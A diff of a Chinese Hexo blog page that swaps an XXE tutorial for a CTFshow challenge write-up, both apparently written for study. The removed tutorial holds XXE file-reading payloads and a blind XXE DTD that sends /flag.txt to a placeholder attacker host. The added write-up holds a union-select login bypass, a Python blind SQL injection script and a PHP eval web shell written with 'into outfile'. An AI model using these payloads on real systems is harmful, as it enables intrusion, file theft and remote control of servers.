@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    XXE-XML基础 |  
+    CTFshow-获得百分之百的快乐 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -47,7 +47,7 @@
   <div id="app">
     <main class="content on">
       <section class="outer">
-  <article id="post-XXE" class="article article-type-post" itemscope
+  <article id="post-CTFshow-获得百分之百的快乐" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -55,7 +55,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  XXE-XML基础
+  CTFshow-获得百分之百的快乐
 </h1>
  
 
@@ -64,8 +64,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/08/04/XXE/" class="article-date">
-  <time datetime="2020-08-04T06:32:42.000Z" itemprop="datePublished">2020-08-04</time>
+      <a href="/2020/08/06/CTFshow-%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/" class="article-date">
+  <time datetime="2020-08-06T14:50:59.000Z" itemprop="datePublished">2020-08-06</time>
 </a>
       
       
@@ -75,7 +75,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.4k</span>
+            <span class="post-count">600</span>
         </span>
     </span>
 
@@ -84,7 +84,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">6 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -95,8 +95,6 @@
 
     
     
-    <div class="tocbot"></div>
-
 
 
 
@@ -109,68 +107,35 @@
       
 
       
-      <p>XXE全称为XML外部实体注入。因此重点学习的地方就在于<strong>外部实体</strong>。</p>
-<p>XML是一种标记语言。用于配置文件，文档格式，图像格式和网络协议等。在解析外部实体的过程中，XML解析器可以根据URL指定的方案或协议来查询各种网络协议和服务。外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。</p>
-<p>XML的格式规范由DTD控制。</p>
-<h4 id="DTD基本格式"><a href="#DTD基本格式" class="headerlink" title="DTD基本格式"></a>DTD基本格式</h4><ul>
-<li>比如DTD这样写</li>
+      <ul>
+<li>来到登录页面，先尝试一下admin/admin弱口令，成功登录。<br><img src="/images/pasted-89.png" alt="upload successful"></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [  &#x2F;&#x2F;定义文档类型，且根元素为message</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt; &#x2F;&#x2F;定义根元素下的子元素</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt; &#x2F;&#x2F;定义子元素的类型</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>那么XML就该这么写了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h4><ul>
-<li>DTD除了定义元素（对应XML中的标签），还可以定义实体（对应XML标签中的内容）。因为ML中除了能标签以外，也需要一些内容是固定的。</li>
-</ul>
-<p><code>XML ENTITY</code>（实体）像是一个信息的占位符（变量）。使用<code>!ENTITY</code>可以定义一个实体，让解析器在解析时获取内容并插入到文档中。</p>
-<p>实体分为内部实体和外部实体</p>
-<p><strong>实体</strong>定义格式为：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code>：</p>
-<h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt; &#x2F;&#x2F;定义实体名称为xxe，内容为test</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; &#x2F;&#x2F;使用&amp;符号来引号实体</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
-
-<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
-<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h5><p><strong>外部实体</strong>定义格式为：<code>!DOCTYPE 实体名称 SYSTEM &quot;文件路径&quot;&gt;</code>，其中<code>SYSTEM</code>说明是外部实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
-<p>这是当我们引用xxe的时候，就会输出指定路径的内容，这样对引用资源所做的任何更改都会在文档中自动更新,非常方便。</p>
 <ul>
-<li>同样的,DTD 可以在 XML 文档内声明，也可以外部引用。这个和内外部实体是一样的。</li>
+<li>点开flag的标签，上面爆出了sql语句。同时url这里可以看到是通过get传参控制文章。那么这里可以测试一下是否存在盲注。<br><img src="/images/pasted-91.png" alt="upload successful"></li>
 </ul>
-<p><strong>内部声明DTD</strong></p>
-<p><code>根元素 [元素声明]&gt;</code></p>
-<p><strong>引用外部声明DTD</strong></p>
-<p><code>根元素 SYSTEM &quot;文件名&quot;&gt;</code>或<code>根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>
-<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>(1)使用 <code>% 实体名</code>(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</p>
-<p>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体</p>
-<p>(3)和通用实体一样，参数实体也可以外部引用</p>
-<p>如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-90.png" alt="upload successful"></p>
+<p>分别测试<code>id=4^1</code>和<code>id=4^0</code>。回显不同，存在盲注点。</p>
+<p><img src="/images/pasted-92.png" alt="upload successful"></p>
+<p><img src="/images/pasted-93.png" alt="upload successful"></p>
+<p>接下来再测试的时候发现过滤了很多关键字,例如<code>()</code>,<code>union</code>等，这里尝试过双写绕过，不过发现最后都被替换为了空格，也就没办法注入了（看到说有注入方法，怎么也想不到，我tcl）</p>
+<p>这里行不通的话就只有回到主页登录页面，查看源码，发现有提示，直接get传参<code>?source=x</code>得到源码。</p>
+<p><img src="/images/pasted-94.png" alt="upload successful"></p>
+<p>源码很好懂，先使用sql语句查询username是否存在，再判断md5的值。BUU上有过一道类似的题是通过联合查询构建虚拟数据绕过登录，如果没有猜到弱口令。也可以通过这个绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;root&amp;username&#x3D;x&#39; union select &#39;63a9f0ea7bb98050796b649e85481845&#39; #</span><br></pre></td></tr></table></figure>
 
-<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>当读取的文件内容中不含有大量特殊字符时，可以利用</p>
-<p><code>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.txt&quot; &gt;</code>成功读取文件内容。当含有类如<code>&lt;、&amp;</code>等符号时，会读取错误。为了避免错误，可以将脚本代码定义为 CDATA。</p>
-<p>CDATA 部分中的所有内容都会被解析器忽略。</p>
-<p>CDATA 部分由 <code>&lt;![CDATA[</code> 开始，由 <code>]]&gt;</code> 结束</p>
-<p>PS:</p>
-<ol>
-<li><p>CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分。</p>
-</li>
-<li><p>标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或折行。</p>
-</li>
-</ol>
-<p>当test.txt中含有特殊字符时，原本的payload如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;test.txt&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
-<p>由于含有特殊字符，考虑要使用CDATA，但XML中并没有需要能将字符串进行拼接，而XML中也不支持实体拼接。因此只能在DTD中拼接实体，在XML中调用。在DTD中只支持参数实体的拼接。</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>
-<p>evil.dtd:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>解读一下，这里先将引用<code>dtd实体</code>，导入了evil.dtd，随后引用all，将<code>%start;%goodies;%end</code>拼接起来并引用。</p>
-<h4 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h4><p>一般在VPS上写入一个XML，一个DTD</p>
-<p>test.XML：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt; </span><br><span class="line"></span><br><span class="line">%remote;%file;%int; ]&gt;</span><br></pre></td></tr></table></figure>
 
-<p>test.DTD:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert-base64.encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;ip&#x2F;pass&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>再访问该xml时就会把flag给带出来。</p>
+<p>可以看到源码中对sql语句是没有做限制的，这里是可以盲注的。</p>
+<p><img src="/images/pasted-95.png" alt="upload successful"></p>
+<p>直接贴上盲注脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;c0b3ee1c-1647-4a77-900c-ab1fa8ddb5fe.chall.ctf.show&#x2F;&#39;</span><br><span class="line">#  sql &#x3D; &#39;database()&#39; # ctfshow_web</span><br><span class="line">#  sql &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&#39; # blogs,f1a9_i5_h3r3,users</span><br><span class="line">#  sql &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;f1a9_i5_h3r3&quot;&#39; # ffff1a9</span><br><span class="line">#  sql &#x3D; &#39;select group_concat(ffff1a9) from f1a9_i5_h3r3&#39;# you find me,but the flag is not here.you can try getshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(32,127):</span><br><span class="line">        payload &#x3D; &#123;</span><br><span class="line">            &#39;username&#39;: &quot;&#39;or ascii(substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#123;&#125;#&quot;.format(sql,i,j),</span><br><span class="line">            &#39;password&#39;: &#39;admin&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.post(url,payload)</span><br><span class="line">        print</span><br><span class="line">        if &#39;&lt;script&gt;window.location.href&#x3D;&quot;page.php&quot;;&lt;&#x2F;script&gt;&#39; in r.text:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>最后提示要getshell，那么直接写入文件,蚁剑连接即可。（源码的sql语句中只选择了密码，所以联合查询时也只有一列）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: username&#x3D;x&#39; union select &quot;&lt;?php eval($_POST[a]) ?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;ma.php&quot; #</span><br></pre></td></tr></table></figure>
+
+<p>连上后在/var/www/html/下找到了flag文件，提示flag在环境变量中，写一个php文件，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传到服务器上后访问该php文件即可在里面找到flag.</p>
 
       
       <!-- reward -->
@@ -239,7 +204,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/08/04/XXE/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/08/06/CTFshow-%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -255,19 +220,10 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/08/06/CTFshow-%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            CTFshow-获得百分之百的快乐
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/07/28/BJDCTF2020-Cookie-is-so-stable/" class="article-nav-link">
+      <a href="/2020/08/04/XXE/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">[BJDCTF2020]Cookie is so stable</div>
+        <div class="article-nav-title">XXE-XML基础</div>
       </a>
     
   </nav>
